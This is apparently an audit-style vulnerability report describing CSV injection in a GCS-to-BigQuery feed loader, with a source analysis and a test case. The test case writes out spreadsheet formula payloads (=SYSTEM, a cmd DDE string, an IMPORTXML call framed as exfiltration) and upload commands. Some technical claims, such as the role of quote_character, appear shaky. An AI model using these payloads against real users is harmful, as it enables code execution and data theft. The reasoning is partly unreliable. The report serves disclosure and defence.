- Vulnerability Name: CSV Injection
- Description:
  1. An attacker crafts a malicious CSV file containing CSV injection payloads within item fields.
  2. The attacker uploads this malicious CSV file to the `FEED_BUCKET` in Google Cloud Storage.
  3. The `import_storage_file_into_big_query` Cloud Function is triggered by the file upload event.
  4. The Cloud Function uses the BigQuery Load API to import the CSV data into a BigQuery table (`feed_data.items`). The Load API configuration does not include any CSV sanitization or escaping mechanisms, and importantly, `quote_character` is set to empty string, effectively disabling quote handling.
  5. A user, such as a data analyst or GMC administrator, queries or downloads the processed data from the `feed_data.items` BigQuery table and exports it as a CSV or TSV file.
  6. The user opens the exported CSV/TSV file using spreadsheet software (e.g., Microsoft Excel, Google Sheets, LibreOffice Calc).
  7. The spreadsheet software detects and interprets the injected formulas (e.g., starting with '=', '@', '+', '-') within the CSV data.
  8. Depending on the malicious payload and the spreadsheet software's security settings, this can lead to:
    - Arbitrary command execution on the user's machine. For example, using `=SYSTEM()` or similar functions.
    - Injection of malicious content or links within the spreadsheet, potentially leading to phishing or further attacks.
- Impact:
  - **High:** If successfully exploited, this vulnerability can lead to arbitrary command execution on the machine of a user who opens the malicious CSV file with vulnerable spreadsheet software. This can allow an attacker to gain control over the user's system, steal sensitive information, or perform other malicious actions. Even without command execution, malicious content injection can be used for phishing or social engineering attacks.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - None. The project does not implement any CSV sanitization or output escaping to prevent CSV injection. The README.md provides instructions on feed schema configuration and header matching, but does not mention or mitigate CSV injection risks.
- Missing Mitigations:
  - **Input Sanitization:** Implement robust CSV sanitization within the `_perform_bigquery_load` function in `/code/cloud_functions/gcs-bq-feed-load/main.py` before loading CSV data into BigQuery. This should include escaping or removing characters that spreadsheet software interprets as formula indicators (e.g., '=', '@', '+', '-'). Consider using a library specifically designed for secure CSV handling.
  - **Documentation and User Warnings:** Add a prominent security warning in the README.md and Dev Ops guide (`/code/documentation/maintenance-guide.md`) about the risks of CSV injection. Advise users to exercise extreme caution when opening CSV/TSV files downloaded from the FeedLoader system and to avoid opening files from untrusted sources. Recommend opening CSV files in plain text editors for inspection before using spreadsheet software.
- Preconditions:
  - An attacker must be able to upload a malicious CSV/TSV file to the `FEED_BUCKET`. This could be achieved through:
    - Compromising a user account with write access to the `FEED_BUCKET`.
    - Exploiting a misconfiguration that allows public uploads to the `FEED_BUCKET`.
    - Socially engineering a user with upload access to upload a malicious file provided by the attacker.
  - A user with access to the BigQuery `feed_data.items` table or the `FEED_BUCKET` must download the processed feed data and open it with spreadsheet software susceptible to CSV injection.
- Source Code Analysis:
  - File: `/code/cloud_functions/gcs-bq-feed-load/main.py`
  - Function: `_perform_bigquery_load`
  - Step-by-step analysis:
    1. The `_perform_bigquery_load` function is responsible for loading CSV/TSV feed files from Google Cloud Storage into BigQuery.
    2. It initializes a `bigquery.LoadJobConfig` object to configure the data loading process.
    3. **Vulnerability Point:** The `bigquery.LoadJobConfig` is configured with `source_format=bigquery.SourceFormat.CSV` and `quote_character=''`. Setting `quote_character` to an empty string disables the use of quote characters for escaping special characters in CSV fields. This means that if a CSV field contains characters like '=', '@', '+', or '-', and they are intended to be treated as literal characters, spreadsheet software will interpret them as formula indicators if the data is later opened in such software.
    4. The `bigquery_client.load_table_from_uri` function is then called to load data from the GCS URI into the BigQuery `items` table using the vulnerable configuration.
  - Visualization:
    ```
    [Malicious CSV File] --> Upload to FEED_BUCKET --> [Cloud Function: import_storage_file_into_big_query] --> [BigQuery Load API (Vulnerable Config)] --> [BigQuery: feed_data.items] --> [User Download CSV/TSV] --> [Spreadsheet Software (Vulnerable)] --> [Command Execution/Malicious Content Injection]
    ```
- Security Test Case:
  1. **Setup:** Ensure you have a running FeedLoader instance deployed to GCP and have the necessary permissions to interact with Google Cloud Storage and BigQuery.
  2. **Create Malicious CSV File:** Create a file named `malicious_feed.csv` with the following content. This CSV contains a formula in the `description` field designed to trigger command execution in spreadsheet software:
     ```csv
     item_id,title,description
     testitem1,Test Product 1,"=SYSTEM(\"calc.exe\")"
     testitem2,Test Product 2,"Normal description"
     ```
     **Note:** `=SYSTEM("calc.exe")` is a Windows-specific example that attempts to open Calculator. For cross-platform testing, you can use other spreadsheet formulas or payloads. For example, `=cmd|'/C notepad'!'A1'` for LibreOffice or `=IMPORTXML("http://example.com","//body")` for Google Sheets to demonstrate data exfiltration.
  3. **Upload Malicious CSV:** Upload `malicious_feed.csv` to your configured `FEED_BUCKET` using `gsutil cp`.
     ```bash
     gsutil cp malicious_feed.csv gs://<YOUR_FEED_BUCKET>/
     ```
  4. **Trigger Feed Processing:** Create an empty EOF file and upload it to the `UPDATE_BUCKET` to initiate FeedLoader processing.
     ```bash
     touch EOF
     gsutil cp EOF gs://<YOUR_UPDATE_BUCKET>/
     ```
  5. **Wait for Processing:** Monitor the Cloud Function logs in the GCP console for `import_storage_file_into_big_query` and `calculate_product_changes` to ensure the feed processing completes successfully without errors.
  6. **Query BigQuery:** Once processing is complete, use the BigQuery console to query the `feed_data.items` table:
     ```sql
     SELECT * FROM `<YOUR_GCP_PROJECT_ID>.feed_data.items`
     ```
  7. **Download CSV from BigQuery:** Download the query results as a CSV file to your local machine.
  8. **Open CSV in Spreadsheet Software:** Open the downloaded CSV file using spreadsheet software like Microsoft Excel or Google Sheets.
  9. **Verify Vulnerability:** Observe if the spreadsheet software:
     - Executes the injected formula (e.g., Calculator application opens on Windows if using `=SYSTEM("calc.exe")`).
     - Displays a security warning indicating potential risks associated with the CSV file content (this behavior depends on the spreadsheet software and its security settings).

This security test case will confirm the CSV injection vulnerability exists in the FeedLoader project.